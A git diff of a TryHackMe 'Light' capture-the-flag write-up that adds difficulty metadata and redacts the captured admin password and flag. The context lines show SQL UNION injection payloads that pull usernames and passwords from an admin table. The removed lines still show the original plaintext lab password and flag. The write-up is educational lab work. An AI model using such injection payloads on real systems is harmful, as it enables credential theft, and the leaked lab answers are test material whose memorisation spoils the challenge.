@@ -1,6 +1,9 @@
 
 # Write-up — Light (TryHackMe) 
 
+**Dificuldade:** Easy
+**OS:** Linux
+
 --- 
 
 ## Lab Description 
@@ -180,7 +183,7 @@ Results:
 - `'Union Select id FROM admintable';` → `Password: 1` ✅
 - `'Union Select id,username FROM admintable';` → Error (2 columns) ❌
 - `'Union Select id || ":::" || username || ":::" || password FROM admintable';`
-	--->`Password: 1 ::: TryHackMeAdmin ::: mamZtAuMlrsEy5bp6q17` ✅ 
+	--->`Password: 1 ::: TryHackMeAdmin ::: [REDACTED] ✅ 
 
 Two challenge answers captured: **username** and **password**. Still missing the flag.
 
@@ -216,8 +219,8 @@ The payload looks like this:
 
 **GOTCHA!** Both records now visible:
 
-- Record 1: `id=1`, `username=TryHackMeAdmin`, `password=mamZtAuMlrsEy5bp6q17`
-- Record 2: `id=2`, `username=flag`, `password=THM{SQLit3_InJ3cTion_is_SimplE_n0?}` 🚩
+- Record 1: `id=1`, `username=TryHackMeAdmin`, `password=[REDACTED]`
+- Record 2: `id=2`, `username=flag`, `password=THM[REDACTED]` 🚩
 
 
 ---
